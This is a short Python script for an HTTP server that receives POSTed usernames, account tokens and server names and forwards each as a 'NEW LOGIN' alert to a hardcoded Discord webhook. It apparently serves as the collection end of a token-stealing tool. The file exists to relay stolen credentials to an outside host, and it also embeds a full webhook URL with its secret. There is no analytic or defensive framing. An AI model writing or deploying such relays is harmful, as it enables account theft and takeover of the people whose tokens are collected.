from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request

WEBHOOK = "https://discord.com/api/webhooks/1457853958667370779/9NEKqkwBwLukL34b1la0YgOExRgFPTo9Oy-OciqmReVrCmwzDMhDwEZiKBjrC55o1Cqx"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            data = json.loads(data)
            
            username = data.get('username', 'Unknown')
            token = data.get('token', '')
            server = data.get('server', '')
            
            print(f"Got: {username} on {server}")
            
            if token:
                short = token[:6] + '...' + token[-4:]
                embed = {
                    "title": "NEW LOGIN",
                    "description": f"User: {username}\nServer: {server}",
                    "fields": [{"name": "Token", "value": f"||{short}||"}],
                    "color": 65280
                }
                req = urllib.request.Request(
                    WEBHOOK,
                    data=json.dumps({"embeds": [embed]}).encode(),
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, format, *args):
        pass

print("Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
